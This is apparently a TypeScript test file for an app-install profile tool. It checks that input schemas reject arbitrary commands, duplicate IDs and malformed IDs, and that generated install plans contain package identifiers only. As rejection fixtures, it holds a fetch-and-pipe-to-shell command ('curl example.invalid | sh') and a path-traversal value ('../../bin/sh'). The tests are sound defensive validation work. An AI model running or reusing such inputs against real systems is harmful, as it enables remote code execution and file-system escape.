import { describe, expect, test } from "bun:test";

import {
	createInstallPlan,
	installPlanInputSchema,
	profileCreateInputSchema,
} from "./domain.ts";

const app = {
	id: "firefox",
	slug: "firefox",
	name: "Firefox",
	description: "Browser",
	category: "browser",
	publisher: "Mozilla",
	homepage: "https://www.mozilla.org/firefox/",
	sourceUrl: "https://github.com/mozilla-firefox/firefox",
	iconUrl: null,
	platforms: ["windows"],
	providers: [
		{ platform: "windows", provider: "winget", packageId: "Mozilla.Firefox" },
	],
};

describe("public input allowlists", () => {
	test("rejects arbitrary command-like fields", () => {
		expect(
			installPlanInputSchema.safeParse({
				profileSlug: "workstation-a1b2c3d4e5",
				platform: "windows",
				command: "curl example.invalid | sh",
			}).success,
		).toBe(false);
	});

	test("rejects duplicate and malformed catalog identifiers", () => {
		expect(
			profileCreateInputSchema.safeParse({
				name: "Workstation",
				appIds: ["firefox", "firefox"],
				policy: "install-missing",
			}).success,
		).toBe(false);
		expect(
			profileCreateInputSchema.safeParse({
				name: "Workstation",
				appIds: ["../../bin/sh"],
				policy: "install-missing",
			}).success,
		).toBe(false);
	});
});

describe("install plan generation", () => {
	test("returns identifiers only and marks missing mappings unsupported", () => {
		const profile = {
			slug: "workstation-a1b2c3d4e5",
			name: "Workstation",
			policy: "install-missing",
			apps: [app],
			createdAt: "2026-08-03T00:00:00.000Z",
		};

		const windows = createInstallPlan(profile, "windows");
		expect(windows.supportedCount).toBe(1);
		expect(windows.steps[0]).toEqual({
			appId: "firefox",
			appName: "Firefox",
			provider: "winget",
			packageId: "Mozilla.Firefox",
			supported: true,
		});

		const linux = createInstallPlan(profile, "linux");
		expect(linux.unsupportedCount).toBe(1);
		expect(linux.steps[0]?.provider).toBeNull();
		expect(linux.steps[0]?.packageId).toBeNull();
	});
});
